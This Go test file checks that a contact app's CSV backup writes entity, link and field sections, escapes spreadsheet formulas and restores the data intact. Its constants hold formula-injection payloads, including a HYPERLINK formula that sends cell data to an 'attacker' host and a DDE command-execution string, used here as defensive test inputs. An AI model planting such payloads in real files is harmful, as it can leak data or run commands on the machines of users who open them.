package controllers

// Issue #2300 (ADR 0043 decision 7): the CSV backup's ENTITIES / ENTITY LINKS /
// ENTITY FIELDS sections. Real migrated schema; the restore half is
// services.RestoreEntityCSV.

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"mycorrhizal/contactmodel"
	"mycorrhizal/internal/dbtest"
	"mycorrhizal/models"
	"mycorrhizal/services"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gorm.io/gorm"
)

const (
	csvEntInjectName  = `=HYPERLINK("http://attacker/?d="&A1,"click")`
	csvEntInjectNotes = `+cmd|' /C calc'!A0`
	csvEntInjectLabel = `@SUM(A1)`
)

func csvEntExport(t *testing.T, router http.Handler) string {
	t.Helper()
	w := httptest.NewRecorder()
	router.ServeHTTP(w, httptest.NewRequest(http.MethodGet, "/export", nil))
	require.Equal(t, http.StatusOK, w.Code)
	return w.Body.String()
}

// csvEntSection returns the raw text of one "=== NAME ===" section, marker
// excluded.
func csvEntSection(t *testing.T, body, marker string) string {
	t.Helper()
	i := strings.Index(body, marker+"\n")
	require.GreaterOrEqual(t, i, 0, "section %s missing", marker)
	rest := body[i+len(marker)+1:]
	if j := strings.Index(rest, "\n=== "); j >= 0 {
		rest = rest[:j]
	}
	return rest
}

func csvEntRows(t *testing.T, section string) [][]string {
	t.Helper()
	r := csv.NewReader(strings.NewReader(section))
	r.FieldsPerRecord = -1
	rows, err := r.ReadAll()
	require.NoError(t, err)
	return rows
}

// seedCSVEntities adds one entity per kind (private/secret/normal), links
// covering a period and a primary, an entity-target definition with a text and
// a negative-number value, and injection payloads in the user-authored text.
func seedCSVEntities(t *testing.T, db *gorm.DB, userID uint, ada, bob models.Contact) {
	t.Helper()
	org := models.Entity{UserID: userID, Kind: models.EntityKindOrganisation, Name: csvEntInjectName, Sensitivity: "normal"}
	require.NoError(t, org.SetCore(&models.OrganisationCore{Organization: contactmodel.Organization{Name: "Acme"}, Notes: csvEntInjectNotes}))
	require.NoError(t, db.Create(&org).Error)
	place := models.Entity{UserID: userID, Kind: models.EntityKindPlace, Name: "Cabin", Sensitivity: "private"}
	require.NoError(t, place.SetCore(&models.PlaceCore{Address: contactmodel.Address{Components: []contactmodel.AddressComponent{{Kind: "locality", Value: "Springfield"}}}}))
	require.NoError(t, db.Create(&place).Error)
	pet := models.Entity{UserID: userID, Kind: models.EntityKindPet, Name: "Rex", Sensitivity: "secret"}
	require.NoError(t, pet.SetCore(&models.PetCore{Species: "dog"}))
	require.NoError(t, db.Create(&pet).Error)

	y, m, endY := 2020, 3, 2022
	require.NoError(t, db.Create(&models.ContactEntityLink{UserID: userID, ContactVCardUID: ada.VCardUID, EntityID: org.ID, Kind: org.Kind,
		Role: "employee", RoleLabel: csvEntInjectLabel, IsPrimary: true, Sensitivity: "private",
		Period: &contactmodel.TemporalRange{Start: &contactmodel.PartialDate{Year: &y, Month: &m}, End: &contactmodel.PartialDate{Year: &endY}}}).Error)
	require.NoError(t, db.Create(&models.ContactEntityLink{UserID: userID, ContactVCardUID: bob.VCardUID, EntityID: pet.ID, Kind: pet.Kind,
		Role: "owner", Sensitivity: "secret"}).Error)

	textDef := models.FieldDefinition{UserID: userID, Label: "Industry label", Key: "industry", Target: "organisation", Type: models.FieldTypeText, Projection: "internal-only", Sensitivity: "normal"}
	numDef := models.FieldDefinition{UserID: userID, Label: "Offset", Key: "offset", Target: "organisation", Type: models.FieldTypeText, Projection: "internal-only", Sensitivity: "normal"}
	require.NoError(t, db.Create(&textDef).Error)
	require.NoError(t, db.Create(&numDef).Error)
	require.NoError(t, db.Create(&models.FieldValue{FieldDefinitionID: textDef.ID, UserID: userID, EntityID: org.ID, Value: json.RawMessage(`"=software"`)}).Error)
	require.NoError(t, db.Create(&models.FieldValue{FieldDefinitionID: numDef.ID, UserID: userID, EntityID: org.ID, Value: json.RawMessage(`-5`)}).Error)
}

func TestExportCSV_EntitySections(t *testing.T) {
	fx := seedCSVFullFidelity(t)
	before := csvEntExport(t, fx.router)
	seedCSVEntities(t, fx.db, fx.user.ID, fx.ada, fx.bob)
	body := csvEntExport(t, fx.router)

	// Appended after every existing section, in this order.
	last := strings.LastIndex(body, "=== REMINDER_COMPLETIONS ===")
	ie, il, iv := strings.Index(body, "=== ENTITIES ==="), strings.Index(body, "=== ENTITY LINKS ==="), strings.Index(body, "=== ENTITY FIELDS ===")
	require.Greater(t, last, 0)
	assert.True(t, last < ie && ie < il && il < iv, "entity sections follow the existing ones: %d %d %d %d", last, ie, il, iv)

	ents := csvEntRows(t, csvEntSection(t, body, "=== ENTITIES ==="))
	assert.Equal(t, []string{"ID", "Kind", "Name", "Sensitivity", "Core (JSON)", "Notes", "Created At", "Updated At"}, ents[0])
	require.Len(t, ents, 4, "header + 3 entities; nothing is filtered by sensitivity")
	sens := map[string]string{}
	for _, r := range ents[1:] {
		sens[r[1]] = r[3]
	}
	assert.Equal(t, map[string]string{"organisation": "normal", "place": "private", "pet": "secret"}, sens)

	links := csvEntRows(t, csvEntSection(t, body, "=== ENTITY LINKS ==="))
	assert.Equal(t, []string{"ID", "Contact ID", "Contact Name", "Entity ID", "Entity Name", "Kind", "Role", "Role Label", "Primary", "Start Date", "End Date", "Sensitivity", "Contact UID"}, links[0])
	require.Len(t, links, 3)
	var emp []string
	for _, r := range links[1:] {
		if r[6] == "employee" {
			emp = r
		}
	}
	require.NotNil(t, emp)
	assert.Equal(t, "true", emp[8])
	assert.Equal(t, "2020-03", emp[9])
	assert.Equal(t, "2022", emp[10])
	assert.Equal(t, "private", emp[11])
	assert.Equal(t, fx.ada.VCardUID, emp[12])

	fields := csvEntRows(t, csvEntSection(t, body, "=== ENTITY FIELDS ==="))
	assert.Equal(t, []string{"Entity ID", "Definition Key", "Value"}, fields[0])
	require.Len(t, fields, 3)

	// Pre-1.7 compatibility: the CONTACTS section is byte-identical, with no
	// organisation column and no column for the entity-target definitions.
	assert.Equal(t, csvEntSection(t, before, "=== CONTACTS ==="), csvEntSection(t, body, "=== CONTACTS ==="))
	assert.NotContains(t, csvEntSection(t, body, "=== CONTACTS ==="), "Industry label")
}

func TestExportCSV_EntitySectionsNeutralizeFormulas(t *testing.T) {
	fx := seedCSVFullFidelity(t)
	seedCSVEntities(t, fx.db, fx.user.ID, fx.ada, fx.bob)
	body := csvEntExport(t, fx.router)

	for _, marker := range []string{"=== ENTITIES ===", "=== ENTITY LINKS ===", "=== ENTITY FIELDS ==="} {
		for _, row := range csvEntRows(t, csvEntSection(t, body, marker)) {
			for _, cell := range row {
				if cell != "" {
					assert.False(t, strings.ContainsRune(csvFormulaLeaders, rune(cell[0])), "%s cell %q starts with a formula leader", marker, cell)
				}
			}
		}
	}
	ents := csvEntSection(t, body, "=== ENTITIES ===")
	assert.Contains(t, ents, `'=HYPERLINK`)
	assert.Contains(t, ents, `'+cmd`, "the Notes column is neutralized too")
	assert.Contains(t, csvEntSection(t, body, "=== ENTITY LINKS ==="), `'@SUM(A1)`)
	assert.Contains(t, csvEntSection(t, body, "=== ENTITY FIELDS ==="), `'-5`, "a negative number value is neutralized")
}

func TestExportCSV_NoEntitiesWritesHeaderOnlySections(t *testing.T) {
	fx := seedCSVFullFidelity(t)
	body := csvEntExport(t, fx.router)
	for _, marker := range []string{"=== ENTITIES ===", "=== ENTITY LINKS ===", "=== ENTITY FIELDS ==="} {
		assert.Len(t, csvEntRows(t, csvEntSection(t, body, marker)), 1, "%s has only its header", marker)
	}
}

// The CSV round-trips: export on one instance, restore into an account that
// holds the same contacts (and, because the CSV carries no definitions, the
// same entity-target definitions).
func TestExportCSV_EntitySectionsRoundTrip(t *testing.T) {
	fx := seedCSVFullFidelity(t)
	seedCSVEntities(t, fx.db, fx.user.ID, fx.ada, fx.bob)
	body := csvEntExport(t, fx.router)

	dst := dbtest.New(t)
	dest := models.User{Username: "csvdest", Password: "password123!A", Email: "csvdest@example.com"}
	require.NoError(t, dst.Create(&dest).Error)
	for _, c := range []models.Contact{fx.ada, fx.bob} {
		require.NoError(t, dst.Create(&models.Contact{UserID: dest.ID, VCardUID: c.VCardUID, Firstname: c.Firstname, Lastname: c.Lastname}).Error)
	}
	for _, key := range []string{"industry", "offset"} {
		require.NoError(t, dst.Create(&models.FieldDefinition{UserID: dest.ID, Label: key, Key: key, Target: "organisation", Type: models.FieldTypeText, Projection: "internal-only", Sensitivity: "normal"}).Error)
	}

	report, err := services.RestoreEntityCSV(context.Background(), dst, dest.ID, strings.NewReader(body))
	require.NoError(t, err)
	require.Empty(t, report.Issues)
	assert.Equal(t, 3, report.EntitiesCreated)
	assert.Equal(t, 2, report.LinksCreated)
	assert.Equal(t, 2, report.FieldValuesCreated)

	var ents []models.Entity
	require.NoError(t, dst.Where("user_id = ?", dest.ID).Order("kind").Find(&ents).Error)
	require.Len(t, ents, 3)
	byKind := map[string]models.Entity{}
	for _, e := range ents {
		byKind[e.Kind] = e
	}
	assert.Equal(t, csvEntInjectName, byKind["organisation"].Name, "the neutralization marker is undone on restore")
	assert.Equal(t, "private", byKind["place"].Sensitivity)
	assert.Equal(t, "secret", byKind["pet"].Sensitivity)
	var srcOrg models.Entity
	require.NoError(t, fx.db.Where("user_id = ? AND kind = ?", fx.user.ID, "organisation").First(&srcOrg).Error)
	assert.JSONEq(t, srcOrg.Core, byKind["organisation"].Core)

	var link models.ContactEntityLink
	require.NoError(t, dst.Where("user_id = ? AND role = ?", dest.ID, "employee").First(&link).Error)
	assert.True(t, link.IsPrimary)
	assert.Equal(t, "private", link.Sensitivity)
	assert.Equal(t, csvEntInjectLabel, link.RoleLabel)
	assert.Equal(t, fx.ada.VCardUID, link.ContactVCardUID)
	require.NotNil(t, link.Period)
	assert.Equal(t, 2020, *link.Period.Start.Year)
	assert.Equal(t, 3, *link.Period.Start.Month)
	assert.Equal(t, 2022, *link.Period.End.Year)
	assert.Nil(t, link.Period.End.Month)

	var vals []models.FieldValue
	require.NoError(t, dst.Where("user_id = ?", dest.ID).Order("id").Find(&vals).Error)
	got := []string{}
	for _, v := range vals {
		got = append(got, string(v.Value))
	}
	assert.ElementsMatch(t, []string{`"=software"`, `-5`}, got)

	// Restoring again is idempotent: the ledger skips what already landed.
	again, err := services.RestoreEntityCSV(context.Background(), dst, dest.ID, strings.NewReader(body))
	require.NoError(t, err)
	assert.Zero(t, again.EntitiesCreated+again.LinksCreated+again.FieldValuesCreated)
}
